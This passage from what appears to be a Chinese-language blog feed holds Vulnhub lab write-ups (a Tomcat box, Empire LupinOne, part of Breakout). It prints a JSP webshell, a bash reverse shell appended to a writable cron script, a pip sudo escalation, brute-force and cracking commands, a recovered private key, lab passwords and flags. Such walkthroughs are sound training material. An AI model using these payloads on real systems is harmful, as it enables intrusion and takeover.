src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022203030422.png" alt="image-20241022203030422"></p><p>首先不存在我们常见的PUT上传漏洞，我们再尝试爆破弱口令，我们这里采用msf进行漏洞检索，首先我们先搜索和tomcat登录有关的漏洞<code>search tomcat login</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022204027471.png" alt="image-20241022204027471"></p><p>之后我们选择<code>use 0</code>，之后就可以开始爆破密码了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022204533750.png" alt="image-20241022204533750"></p><p>这里成功登录进去了，账号密码是<code>tomcat:role1</code>，我们尝试在web端进行登录，结果如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022204927709.png" alt="image-20241022204927709"></p><h2 id="获取shell权限"><a href="#获取shell权限" class="headerlink" title="获取shell权限"></a>获取shell权限</h2><p>我们首先构造一个jsp文件，命名为<code>shell.jsp</code>，内容如下所示</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">      <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  U(ClassLoader c)&#123;</span><br><span class="line">  <span class="built_in">super</span>(c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>,String.class).invoke(clazz.newInstance(),str);</span><br><span class="line"> &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line"> <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span>clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line"> <span class="keyword">return</span>(<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>,String.class).invoke(decoder,str);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">       <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span>request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span>(cls != <span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext); </span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>我们再把这个文件压缩为war格式，我们直接cmd运行<code>jar -cvf shell.war *</code>即可生成我们需要的war文件，我们直接上传该文件，由于服务器上已经有该文件，所以这里我们将其改名为<code>tomcatshell.war</code>再上传即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022232228772.png" alt="image-20241022232228772"></p><p>点击启动后再次访问即可，如果可以访问就说明没问题</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022232402300.png" alt="image-20241022232402300"></p><p>可以访问，我们直接蚁剑连接，然后反弹shell</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022232603927.png" alt="image-20241022232603927"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022232939812.png" alt="image-20241022232939812"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022232949356.png" alt="image-20241022232949356"></p><p>成功将shell权限反弹到我们的kali上，接下来就是进行权限的提升</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们首先在当前目录下执行<code>sudo -l</code>，但是没办法直接执行，需要输入当前用户的密码，而且tomcat用户下也并未发现什么有价值的信息，我们只能切换到其他用户目录下看看有没有什么信息。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022234159845.png" alt="image-20241022234159845"></p><p>其中发现了一个<code>user.txt</code>和一个<code>notes.txt</code>，其中<code>user.txt</code>没有权限打开，但是<code>notes.txt</code>可以被打开，里面告诉了我们一个后门可执行文件，我们先去查看一下这个可执行文件的内容</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023101106071.png" alt="image-20241023101106071"></p><p>这个脚本给了我们两个关键信息，一个是需要备份的文件路径是<code>/opt/tomcat/</code>，备份文件存放的路径是<code>/var/backups</code>，而且这是一个定时任务，我们先来查看一下文件权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure><p>我们可以发现这个文件属于root用户，而且所有用户都具有写入权限，我们试着写入反弹shell语句，如果能够成功执行，我们就可以拿到root权限，我们在文件中写入如下语句</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.20.138/9002 0&gt;&amp;1&#x27;&quot;</span> &gt;&gt; backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1a3e55afebfa9423d1537d3925b49d27.png" alt="1a3e55afebfa9423d1537d3925b49d27"></p><p>我们已经成功写入进去，我们试着执行这个文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023103641196.png" alt="image-20241023103641196"></p><p>虽然这里提示失败，但是我们的kali已经成功接收到shell权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023103714901.png" alt="image-20241023103714901"></p><p>成功拿到root.txt文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3a1c85bebf8833b0ecae900fb8598b17</span><br></pre></td></tr></table></figure><p>我们再去找user.txt文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241023103856239.png" alt="image-20241023103856239"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a837c0b5d2a8a07225fd9905f5a0e9c4</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>tomcat弱密码爆破以及任意文件上传漏洞</li><li>后门脚本权限配置错误导致获得权限</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-Empire_LupinOne</title>
      <link href="/post/4ebdb119.html"/>
      <url>/post/4ebdb119.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/empire/01-Empire-Lupin-One.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：</p><ol><li>这个盒子被创建为中等大小，但如果你迷路了可能会很困难。</li><li>CTF 就像盒子。 你必须尽可能多地列举。</li></ol><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.146</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021170605800.png" alt="image-20241021170605800"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.146</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021171101363.png" alt="image-20241021171101363"></p><p>开放了<code>80</code>端口和<code>22</code>端口，我们首先试试80端口能否获取到有价值的信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021171234341.png" alt="image-20241021171234341"></p><p>先使用dirsearch扫描网站目录，并没有什么有价值的信息，只有一个robots.txt，我们尝试去访问一下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021172254741.png" alt="image-20241021172254741"></p><p>我们查看源码，看到了下面这句话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Your can do it, keep trying. --&gt;</span><br></pre></td></tr></table></figure><p>说明我们的思路是对的，这个404并不是真的访问不到，而是他网页故意设计成了404的样式，同时我们要知道在linux中，~ 指代用户主目录，我们可以尝试找到与此相似的路径，使用<code>ffuf</code>工具对其路径进行测试，我们运行以下语句，然后慢慢等就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w &quot;C:\Users\Administrator\Desktop\目录字典\directory-list-2.3-small.txt&quot; -u http://192.168.20.146/~FUZZ/ -mc 200 -c -v</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021204448651.png" alt="image-20241021204448651"></p><h2 id="漏洞初探"><a href="#漏洞初探" class="headerlink" title="漏洞初探"></a>漏洞初探</h2><p>我们可以发现存在一个隐藏路径，我们直接访问这个路径，看看这个路径下面是什么东西</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021204701232.png" alt="image-20241021204701232"></p><p>这里告诉我们了两个信息：</p><ol><li>还存在后门文件存放着ssh的私钥</li><li>用户名为icex64</li></ol><p>所以我们还需要去爆破后门文件，我们仍然使用ffuf进行爆破，爆破语句如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -w &quot;C:\Users\Administrator\Desktop\目录字典\directory-list-2.3-medium.txt&quot;</span><br><span class="line"> -u http://192.168.20.146/~secret/.FUZZ/ -e .txt .pub .html .bak -mc 200 -c -v</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/fb893001fcd2ecb4ebb8180b06b91052.png" alt="在这里插入图片描述"></p><p>我们这里直接访问即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021211357182.png" alt="image-20241021211357182"></p><p>我们将这一串拿去解密即可，这里使用的是base58加密方式，我们拿base58进行解密，解密结果如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp</span><br><span class="line">PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk</span><br><span class="line">9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9</span><br><span class="line">H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6</span><br><span class="line">xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7</span><br><span class="line">J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu</span><br><span class="line">/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0</span><br><span class="line">ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I</span><br><span class="line">he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf</span><br><span class="line">XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA</span><br><span class="line">hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb</span><br><span class="line">4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq</span><br><span class="line">mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp</span><br><span class="line">MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA</span><br><span class="line">2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb</span><br><span class="line">QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE</span><br><span class="line">vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ</span><br><span class="line">0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft</span><br><span class="line">rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB</span><br><span class="line">QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy</span><br><span class="line">x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG</span><br><span class="line">nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5</span><br><span class="line">VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO</span><br><span class="line">cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh</span><br><span class="line">nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm</span><br><span class="line">8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH</span><br><span class="line">zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw</span><br><span class="line">n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl</span><br><span class="line">AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93</span><br><span class="line">oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI</span><br><span class="line">63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV</span><br><span class="line">y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+</span><br><span class="line">t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2</span><br><span class="line">Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU</span><br><span class="line">yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI</span><br><span class="line">8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU</span><br><span class="line">mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r</span><br><span class="line">VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ</span><br><span class="line">E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ</span><br><span class="line">BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2</span><br><span class="line">yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+</span><br><span class="line">wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P</span><br><span class="line">5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8</span><br><span class="line">vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ</span><br><span class="line">Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB</span><br><span class="line">1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB</span><br><span class="line">ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC</span><br><span class="line">iUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>这就是登录系统的私钥，我们想办法去利用一下这个私钥去登录系统，我们可以利用kali自带的ssh2john进行密码的暴力破解，同时，网页提示了我们使用fasttrack密码本，所以我们构造的破解语句如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh2john pass_rsa &gt; password.txt</span><br><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt password.txt</span><br><span class="line">john --show password.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021213150628.png" alt="image-20241021213150628"></p><p>所以用户的账号密码分别为<code>icex64:P@55w0rd!</code></p><h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统"></a>登录系统</h2><p>我们尝试使用账号密码登录系统</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022143827709.png" alt="image-20241022143827709"></p><p>zheli就会出现其第一个坑，就是我们得出来的密码并不是系统登录的密码，而是这个私钥的密码，可以理解为隐藏在这个私钥里面的密码，这个密码和登录系统的密码并不是同一个东西，所以会导致我们用xshell连接不上，只能使用私钥进行登录，但是在我的尝试过程中，又会一直出现登不上的过程，我都几乎崩溃快要放弃了，如下图情况所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022160827427.png" alt="image-20241022160827427"></p><p>后来在一个国外的博客上发现了问题，其实就是Windows上和linux上换行符不一致的原因，导致我们的linux系统不能正确识别这个文件，解决办法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dos2unix key</span><br><span class="line">vim --clean key </span><br><span class="line">按esc键后输入wq退出即可</span><br><span class="line">chmod 600 key</span><br><span class="line">ssh icex64@192.168.20.146 -i key</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022161205716.png" alt="image-20241022161205716"></p><p>我们可以发现成功登录，同时获得第一个flag：user.txt</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022161329900.png" alt="image-20241022161329900"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3mp!r3&#123;I_See_That_You_Manage_To_Get_My_Bunny&#125;</span><br></pre></td></tr></table></figure><h2 id="权限水平移动"><a href="#权限水平移动" class="headerlink" title="权限水平移动"></a>权限水平移动</h2><p>我们首先执行<code>sudo -l</code>查看是否可以进行sudo提权</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022161835725.png" alt="image-20241022161835725"></p><p>我们发现这里有一个py脚本，但是是arsene用户的，我们先看一下这个文件执行了什么东西</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Its not yet ready to get in action&quot;</span>)</span><br><span class="line"></span><br><span class="line">webbrowser.<span class="built_in">open</span>(<span class="string">&quot;https://empirecybersecurity.co.mz&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们查看一下这个文件的权限，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022163520866.png" alt="image-20241022163520866"></p><p>只有所有者arsene具有写入权限，其余的用户只有可读权限，如果无法写入反弹shell语句的话，我们很难获得arsene用户的权限，这时候我们可以发现其<code>import webbrowser</code>，我们试着去找一找<code>webbrowser</code>文件在哪</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;*webbrowser*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022164355583.png" alt="image-20241022164355583"></p><p>我们试着看有没有写入权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022164624861.png" alt="image-20241022164624861"></p><p>所有的用户都具有读写执行权限，所以我们尝试在这个文件做手脚进行反弹shell</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022164759993.png" alt="image-20241022164759993"></p><p>我们发现这里<code>import os</code>，我们可以利用os获得运行权限，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/d6999bb21c2e06f32935dc37909a0bf8.png" alt="d6999bb21c2e06f32935dc37909a0bf8"></p><p>我们直接运行<code>heist.py</code>文件，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022165418164.png" alt="image-20241022165418164"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>成功获得权限，我们再执行一下<code>sudo -l</code>，发现在这个用户下存在root用户的sudo权限</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022165522915.png" alt="image-20241022165522915"></p><p>我们可以利用pip进行sudo提权，直接逐步输入以下shell去获取权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022170243947.png" alt="image-20241022170243947"></p><p>成功获得root权限，并且找到第二个flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241022170342727.png" alt="image-20241022170342727"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3mp!r3&#123;congratulations_you_manage_to_pwn_the_lupin1_box&#125;</span><br></pre></td></tr></table></figure><p>本题到此结束</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>ssh私钥的利用</li><li>使用john破解密码</li><li>利用os进行权限横向移动</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战打靶 </tag>
            
            <tag> 红队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub打靶-Breakout</title>
      <link href="/post/1aad57b9.html"/>
      <url>/post/1aad57b9.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>靶机下载：<code>https://download.vulnhub.com/empire/02-Breakout.zip</code></p><p>攻击机器：192.168.20.128（Windows操作系统）&amp; 192.168.20.138（kali）</p><p>提示信息：这台靶机被设计为简单难度的靶机，但如果你迷失方向，它可能会变成中等难度。</p><p>靶机：192.168.20.0/24</p><p>目标：获取2个flag+root权限</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老样子首先使用<code>arp-scan -l</code>对主机进行探活，发现主机IP为<code>192.168.20.145</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021112803260.png" alt="image-20241021112803260"></p><p>之后对开放的端口进行扫描，执行<code>nmap -O -sV -p- -A 192.168.20.145</code>，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021113223105.png" alt="image-20241021113223105"></p><p>这里开放了80端口，说明还是从80端口进行渗透，我们首先访问80端口，结果如下</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021113254460.png" alt="image-20241021113254460"></p><p>首先还是进行后门路径的扫描吧，先使用默认字典进行扫描，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021113706094.png" alt="image-20241021113706094"></p><p>可以发现有一个<code>/manual/index.html</code>的路径，我们尝试访问</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021145159228.png" alt="image-20241021145159228"></p><p>这是一个Apache的官网，其域名的指向显示的也是apache的官网，显然是重定向到apache的官网上去了，所以这里也并没有什么有价值的信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021145401491.png" alt="image-20241021145401491"></p><p>同时我们在之前的端口扫描中可以发现其<code>10000</code>端口和<code>20000</code>同样开放了，且是http服务，我们尝试访问这两个端口，看看有没有什么关键信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021145917638.png" alt="image-20241021145917638"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021145932153.png" alt="image-20241021145932153"></p><p>我们可以发现是两个登录框，那么现在就是要找到账号密码登录进去即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021150145462.png" alt="image-20241021150145462"></p><p>我们在80端口页面的源码中找到了加密过的账号密码，即用户的账号密码泄露了，我们只要对这串字符进行解密就可以拿到登录的账号密码，然后我们就可以成功登录那两个页面。</p><h2 id="破解用户名"><a href="#破解用户名" class="headerlink" title="破解用户名"></a>破解用户名</h2><p>这是非常经典的<code>brainfuck</code>加密方式，我们拿去解密，发现这串密码为<code>.2uqPEfj3D&lt;P&#39;a-3</code>，但是我们还不知道用户名，这个时候我们采用burp对用户名进行爆破，但是发现请求过快会被服务器拒绝连接，所以也不能直接进行爆破</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021152214134.png" alt="image-20241021152214134"></p><p>我这里试着把请求速度改慢一点，发现还是不行，说明这里不适合用burp进行爆破，我们只能试着换其他方式，这里通过查看wp发现使用了一种新的信息收集工具，<code>enum4linux</code>，这个工具是一个枚举工具，是用于枚举windows和Linux系统上的SMB服务的工具，可以轻松的从与SMB服务有关的目标中快速提取信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021153643797.png" alt="image-20241021153643797"></p><p>同时在前期的信息收集的过程中，我们可以发现我们的主机同样开放了139端口和445端口，所以这里我们应该使用<code>enum4linux</code>进行信息的收集</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021154020807.png" alt="image-20241021154020807"></p><p>我们成功发现登录的用户名为cyber，接着我们尝试着去登录我们的两个网站，看看是否能有新的发现，我们只能登录usermin界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/4c9ec8fa39d2d9af2706e64783e7454c.png" alt="4c9ec8fa39d2d9af2706e64783e7454c"></p><p>我们发现这里可以使用命令行，我们尝试使用命令行对服务器进行控制，这里我们发现了第一个flag值</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021154735455.png" alt="image-20241021154735455"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们发现该目录下有一个可执行文件<code>tar</code>，在这里放一个可执行文件肯定有其深意，我们还是先用<code>linpeas.sh</code>进行相关信息查询</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241021155900149.png" 